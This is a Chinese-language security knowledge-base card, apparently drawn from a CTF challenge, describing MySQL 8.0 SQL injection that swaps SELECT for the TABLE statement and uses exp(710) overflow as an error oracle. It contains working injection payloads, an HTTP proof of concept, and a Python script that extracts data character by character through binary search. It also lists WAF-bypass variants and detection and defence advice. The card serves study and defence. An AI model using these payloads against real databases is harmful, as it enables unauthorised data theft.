---
id: web-generic-sqli-mysql8-table-keyword-exp-error-bypass
title: MySQL 8.0 TABLE 语句替代 SELECT + exp(710) 溢出报错：绕过 select 关键字过滤的无列名注入
type: scenario
domain: web
path: web/generic/sqli
technique: mysql8-table-keyword-exp-error-bypass
tags:
- web
- sqli
- mysql
- waf-bypass
- error-based
- table-statement
- row-comparison
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: MySQL 8.0（原文标注；TABLE 语句为 8.0.19 起特性）
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:13:35+08:00'
  notes: 已对照原文 Ai-waf 题核对 TABLE/exp(710)/行比较 payload；affected_versions 按原文 MySQL 8.0 保留（正文补充 8.0.19 起支持 TABLE）；未对真实目标执行二分脚本，频率限制需按原文重试。
url: /docs/web/generic/sqli/web-generic-sqli-mysql8-table-keyword-exp-error-bypass/
draft: false
kb_aliases:
- MySQL 8.0 TABLE 注入
- TABLE 替代 SELECT
- exp(710) 报错注入
- 无列名注入 TABLE
- 绕过 select 过滤
- MySQL TABLE statement injection
---

## 一句话结论

当 WAF 只拦截 `select` 关键字时，MySQL 8.0 可用 `TABLE 表名` 等价替代 `SELECT * FROM 表名`，配合行构造器比较 `(TABLE ... LIMIT 1) > ('def','mysql',...)` 做无列名布尔判断，再用 `if(条件, exp(710), 1)` 触发 DOUBLE 溢出错误作为报错 oracle，从而在不出现 `select` 的情况下逐字符提取数据。

## 原理

- **TABLE 是 SELECT 的同义语句**：MySQL 8.0.19 引入 `TABLE tbl_name`，语义等价于 `SELECT * FROM tbl_name`，返回该表所有列。它不含 `select` 关键字，能绕过只做 `select` 子串匹配的 WAF。
- **行构造器比较**：`(a,b,c) > (x,y,z)` 按字典序逐列比较。把 `TABLE information_schema.tables LIMIT 1` 作为一行，与 `('def','mysql','columns_pra',1,...)` 比较，可在不知道列名的情况下判断当前行落在哪一侧，用于二分提取表名/库名。
- **无列名读取目标表**：`TABLE where_is_my_flagggggg LIMIT 0,1` 直接返回目标表第一行，再与用户构造的字符串元组比较，即可逐字符确定 flag，无需知道任何列名。
- **exp(710) 为什么报错**：MySQL 的 `exp()` 返回 DOUBLE，`exp(710) ≈ 2.2e308` 超过 DOUBLE 上限 `1.797e308`，求值即抛 `DOUBLE value is out of range`。把它放进 `if(cond, exp(710), 1)`，条件为真时执行 `exp(710)` 触发错误，条件为假时返回 1；响应是否报错就是布尔 oracle。
- **组合效果**：整个 payload 不出现 `select`、不依赖列名，只使用 `TABLE`、`if`、`exp` 和行比较，因此同时绕过关键字过滤与列名未知的限制。

## 触发条件

- 目标为 MySQL 8.0（`TABLE` 语句可用，8.0.19 及以上；原文只标注 MySQL 8.0）。
- 存在可注入的字符串/数字上下文，且后端把 SQL 错误信息或状态差异返回给客户端（或盲注可区分报错/正常）。
- WAF/黑名单拦截 `select`，但未拦截 `table`、`if`、`exp`、`information_schema`。
- 注入点允许子查询/表达式；若 `TABLE` 不能出现在该位置，需要换其他同义写法。

## 利用步骤

1. 确认注入：提交单引号/逻辑表达式，观察报错或页面差异。
2. 验证 `TABLE` 可用：`-1' || (TABLE information_schema.tables LIMIT 1) > ('def') #`，观察真假响应。
3. 构造报错 oracle：`-1' || if((TABLE information_schema.tables LIMIT 1)>('def','mysql','columns_pra',1,...), exp(710), 1) #`。
4. 用二分法逐字符比较目标表行：`0' || if((TABLE where_is_my_flagggggg LIMIT 0,1) > ('猜测前缀'), exp(710), 1) || '1'='1`。
5. 根据报错/正常响应调整二分区间，直到拼出完整 flag；对频率限制加延时与重试。

## PoC

```http
POST /search HTTP/1.1
Content-Type: application/json

{"query":"-1' || if((TABLE information_schema.tables LIMIT 1)>('def','mysql','columns_pra',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1),exp(710),1)#"}
```

```python
import json, requests, time

URL = "http://TARGET/search"

def oracle(payload: str) -> bool:
    r = requests.post(URL, data=json.dumps({"query": payload}),
                      headers={"Content-Type": "application/json"}, timeout=10)
    # 报错/异常响应代表条件为真；按目标实际响应调整
    return "error" not in r.text.lower() and "频繁" not in r.text

flag = ""
for _ in range(100):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        guess = flag + chr(mid)
        p = (f"0' || if((TABLE where_is_my_flagggggg LIMIT 0,1)"
             f">('{guess}'),exp(710),1) || '1'='1")
        if oracle(p):
            hi = mid
        else:
            lo = mid + 1
        time.sleep(0.3)
    flag += chr(lo - 1)
    if flag.endswith("}"):
        break
print(flag)
```

## 变体与关联

- 变体：`TABLE` 语句也可用于 `UNION` 查询，或配合 `VALUES ROW(...)` 构造派生表。
- 变体：用 `exp(999)`、`pow(2,10000)` 等触发数值溢出/错误，效果类似 `exp(710)`。
- 变体：若 `TABLE` 被新版 WAF 拦截，可尝试 `/*!50000select*/`、大小写/注释混淆或堆叠查询。
- 关联卡片：[[web-generic-sqli-error-based-extraction]]、[[web-generic-sqli-blind-filter-bypass-functions]]、[[web-generic-sqli-keyword-double-write-bypass]]、[[web-generic-sqli-sqlite-union-values-select-filter-bypass]]。

## 检测与防御

- 检测：SQL 日志/审计中出现 `TABLE information_schema`、`TABLE <业务表>`、`exp(710)`、`exp(999)`、`if(` 与行构造器比较组合。
- 检测：WAF 命中 `select` 但请求中同时出现 `table`、`information_schema`、大量 `if(`/`exp(`。
- 防御：使用参数化查询/预编译，禁止拼接；WAF 规则覆盖 `TABLE`、`exp`、`if`、行构造器；关闭详细 SQL 错误回显。
- 防御：数据库账号最小权限，限制 `information_schema` 访问；对高频二分请求做限速与行为检测。
